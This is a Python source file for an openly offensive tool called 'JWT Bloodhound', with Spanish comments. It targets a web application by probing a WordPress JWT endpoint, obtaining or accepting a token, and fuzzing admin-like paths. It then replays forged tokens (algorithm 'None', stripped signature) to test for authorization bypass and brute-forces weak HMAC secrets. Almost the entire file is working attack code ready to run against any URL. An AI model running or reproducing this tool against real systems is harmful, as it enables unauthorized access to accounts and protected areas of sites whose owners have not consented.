import asyncio
import aiohttp
import hmac
import hashlib
import base64
import json
import sys
import re
import time
import logging
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any, Callable, Generator, Coroutine
from enum import Enum, auto
from functools import wraps

# ==============================================================================
#  🏗️ CORE ARCHITECTURE & UTILS
# ==============================================================================

# Configuración de Logging profesional, nada de print() crudos por ahí
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("BLOODHOUND")

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"

# --- DECORATORS ---

def audit_log(func: Callable[..., Any]) -> Callable[..., Any]:
    """Decorador para registrar la ejecución de métodos críticos."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        # Usamos introspección para saber qué método se llama
        method_name = func.__name__.upper()
        logger.debug(f"Ejecutando operación crítica: {method_name}")
        return func(*args, **kwargs)
    return wrapper

def async_timer(func: Callable[..., Coroutine]) -> Callable[..., Coroutine]:
    """Decorador asíncrono para medir tiempos de respuesta (Latency Tracking)."""
    @wraps(func)
    async def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = await func(*args, **kwargs)
        end = time.perf_counter()
        elapsed = (end - start) * 1000
        # Solo logueamos si es lento (>500ms), para no saturar
        if elapsed > 500:
            logger.warning(f"🐢 {func.__name__} tomó {elapsed:.2f}ms")
        return result
    return wrapper

# --- DATA STRUCTURES (DDD - Domain Driven Design Lite) ---

class Severity(Enum):
    INFO = auto()
    LOW = auto()
    HIGH = auto()
    CRITICAL = auto()

@dataclass(frozen=True)
class TargetConfig:
    """Configuración inmutable del objetivo."""
    base_url: str
    user_agent: str = "Bloodhound/4.0-Architect"
    timeout: int = 10

@dataclass
class ScanResult:
    """DTO para transferir resultados de escaneo."""
    endpoint: str
    status_code: int
    payload: Optional[str] = None
    severity: Severity = Severity.INFO

    def __str__(self) -> str:
        icon = "🔥" if self.severity == Severity.CRITICAL else "ℹ️"
        return f"{icon} [{self.status_code}] {self.endpoint} -> {self.severity.name}"

# ==============================================================================
#  🧠 BUSINESS LOGIC: ATTACK VECTORS
# ==============================================================================

class JWTManipulator:
    """Clase estática (Utilities) para manipulación de bajo nivel de JWT."""
    
    @staticmethod
    def b64url_decode(data: str) -> bytes:
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

    @classmethod
    def forge_token(cls, header: Dict, payload: Dict, signature: bytes = b"") -> str:
        h_b64 = cls.b64url_encode(json.dumps(header).encode())
        p_b64 = cls.b64url_encode(json.dumps(payload).encode())
        s_b64 = cls.b64url_encode(signature) if signature else ""
        return f"{h_b64}.{p_b64}.{s_b64}"

# ==============================================================================
#  🚀 CORE ENGINE
# ==============================================================================

class BloodhoundEngine:
    """
    Motor principal. Usa Context Manager asíncrono para gestión de recursos.
    Implementa el patrón Facade para simplificar la interfaz de uso.
    """
    
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None
        self._token: Optional[str] = None

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=50, ssl=False) # High concurrency
        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=connector,
            headers={"User-Agent": self.config.user_agent},
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    @property
    def token(self) -> str:
        if not self._token:
            raise ValueError("Token no establecido. Ejecuta autenticación primero.")
        return self._token

    @token.setter
    def token(self, value: str):
        self._token = value
        # Actualizamos headers de la sesión globalmente
        if self.session:
            self.session.headers.update({"Authorization": f"Bearer {value}"})

    @async_timer
    async def pre_flight_check(self) -> bool:
        """Verificación rápida de tecnología."""
        print(colorize("\n🧠 FASE 0: PRE-FLIGHT CHECK", Colors.BOLD))
        if not self.session: raise RuntimeError("Session not initialized")

        target = "/wp-json/jwt-auth/v1/token"
        try:
            async with self.session.post(target) as resp:
                if resp.status == 404:
                    logger.info("WordPress JWT plugin no detectado.")
                    return False
                print(colorize(f"✅ Endpoint activo: {resp.status}", Colors.GREEN))
                return True
        except Exception as e:
            logger.error(f"Error de conexión: {str(e)}")
            return False

    @audit_log
    async def hunt_credentials(self, login_path: str, creds: Dict[str, str]) -> Optional[str]:
        """Intenta obtener credenciales y extraer el token."""
        print(colorize(f"🕵️  Cazando token en: {login_path}", Colors.YELLOW))
        
        if not self.session: raise RuntimeError("Session not initialized")

        try:
            # Intentamos JSON primero
            async with self.session.post(login_path, json=creds) as resp:
                text = await resp.text()
                if resp.status == 200:
                    return self._extract_token_regex(text)
                
            # Fallback a Form Data
            async with self.session.post(login_path, data=creds) as resp:
                text = await resp.text()
                if resp.status == 200:
                    return self._extract_token_regex(text)

        except Exception as e:
            logger.error(f"Fallo en autenticación: {e}")
        
        return None

    def _extract_token_regex(self, content: str) -> Optional[str]:
        match = re.search(r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+', content)
        if match:
            t = match.group(0)
            print(colorize("✅ TOKEN OBTENIDO", Colors.GREEN))
            return t
        return None

    async def fuzz_endpoints(self, wordlist: List[str]) -> List[str]:
        """Fuzzing concurrente usando asyncio.gather."""
        print(colorize("\n🐕 SOLTANDO AL SABUESO (ASYNC)...", Colors.BOLD))
        
        tasks = [self._check_endpoint(path) for path in wordlist]
        # Ejecutamos todas las peticiones en paralelo real
        results = await asyncio.gather(*tasks)
        
        # Filtramos los None
        found = [r for r in results if r is not None]
        
        if not found:
            print(colorize("🤷 Sin presas. Usando root.", Colors.CYAN))
            return ["/"]
        return found

    async def _check_endpoint(self, path: str) -> Optional[str]:
        if not self.session: return None
        try:
            async with self.session.get(path) as resp:
                if resp.status in [200, 401, 403]:
                    print(f"  -> {colorize(str(resp.status), Colors.RED)} en {path}")
                    return path
        except:
            pass
        return None

    # --- ATTACK VECTORS (CLOSURES & GENERATORS) ---

    def _generate_attacks(self) -> Generator[Dict[str, Any], None, None]:
        """
        Generador que yielda configuraciones de ataque. 
        Esto desacopla la creación del payload de la ejecución.
        """
        parts = self.token.split('.')
        header = json.loads(JWTManipulator.b64url_decode(parts[0]))
        payload = json.loads(JWTManipulator.b64url_decode(parts[1]))

        # Attack 1: None Algo
        h_none = header.copy(); h_none['alg'] = 'None'
        yield {
            "name": "Algorithm None",
            "token": JWTManipulator.forge_token(h_none, payload)
        }

        # Attack 2: Stripped Signature
        yield {
            "name": "Signature Stripping",
            "token": f"{parts[0]}.{parts[1]}."
        }
        
        # Attack 3: Brute Force (Simplificado para demo)
        # Aquí normalmente iría una lógica más compleja
        yield {
            "name": "Weak Secret Check",
            "check_func": lambda: self._brute_force_secret(parts, ["secret", "123456", "admin"])
        }

    def _brute_force_secret(self, parts: List[str], wordlist: List[str]) -> Optional[str]:
        msg = f"{parts[0]}.{parts[1]}".encode()
        sig = JWTManipulator.b64url_decode(parts[2])
        
        for secret in wordlist:
            if hmac.new(secret.encode(), msg, hashlib.sha256).digest() == sig:
                return secret
        return None

    async def execute_attacks(self, targets: List[str]):
        """Orquestador de ataques."""
        print(colorize("\n⚔️  INICIANDO FASE DE ATAQUE", Colors.BOLD))
        
        for target_url in targets:
            print(f"🎯 Target: {target_url}")
            
            for attack in self._generate_attacks():
                if "token" in attack:
                    # Ataque de repetición con token modificado
                    await self._send_attack(target_url, attack["token"], attack["name"])
                elif "check_func" in attack:
                    # Ataque local (cracking)
                    res = attack["check_func"]()
                    if res:
                         print(colorize(f"  🔥 [CRITICAL] CLAVE: '{res}'", Colors.RED))

    async def _send_attack(self, url: str, token: str, attack_name: str):
        if not self.session: return
        try:
            # Override headers just for this request
            headers = {"Authorization": f"Bearer {token}"}
            async with self.session.get(url, headers=headers) as resp:
                if resp.status == 200:
                     print(colorize(f"  🎉 [VULNERABLE] {attack_name}: BYPASS EXITOSO", Colors.GREEN))
                else:
                    logger.debug(f"{attack_name} falló con {resp.status}")
        except Exception:
            pass

# ==============================================================================
#  🏁 MAIN ENTRY POINT
# ==============================================================================

async def main():
    print(colorize("""
    🩸 JWT BLOODHOUND v4.0 - ARCHITECT EDITION 🩸
    """, Colors.RED))

    # Input handling (simulado para limpieza, en prod usaríamos argparse/click)
    base_url = input(">> URL Base: ").strip()
    if not base_url.startswith("http"): base_url = f"http://{base_url}"
    
    config = TargetConfig(base_url=base_url)

    # El Context Manager se encarga de abrir/cerrar conexiones
    async with BloodhoundEngine(config) as engine:
        
        # 1. Pre-flight
        should_continue = await engine.pre_flight_check()
        if not should_continue:
            if input(">> ¿Continuar de todos modos? (s/N): ").lower() != 's':
                sys.exit(0)

        # 2. Auth Flow
        choice = input("\n[1] Pegar Token  [2] Auto-Login\n>> ").strip()
        if choice == '2':
            user = input("User: ")
            pwd = input("Pass: ")
            # Usamos un heurístico simple para la URL de login
            login_url = "/auth/login" if "/api" in base_url else "/wp-json/jwt-auth/v1/token"
            
            token = await engine.hunt_credentials(login_url, {"username": user, "password": pwd})
        else:
            token = input(">> Token JWT: ").strip()

        if not token:
            print(colorize("❌ No hay token, no hay fiesta.", Colors.RED))
            sys.exit(1)
        
        engine.token = token # Setter con lógica de actualización de headers

        # 3. Discovery & Attack
        targets = await engine.fuzz_endpoints([
            "/admin", "/dashboard", "/api/v1/user", "/secure", "/profile"
        ])
        
        await engine.execute_attacks(targets)

if __name__ == "__main__":
    try:
        # Cross-platform async loop
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Interrupción manual.")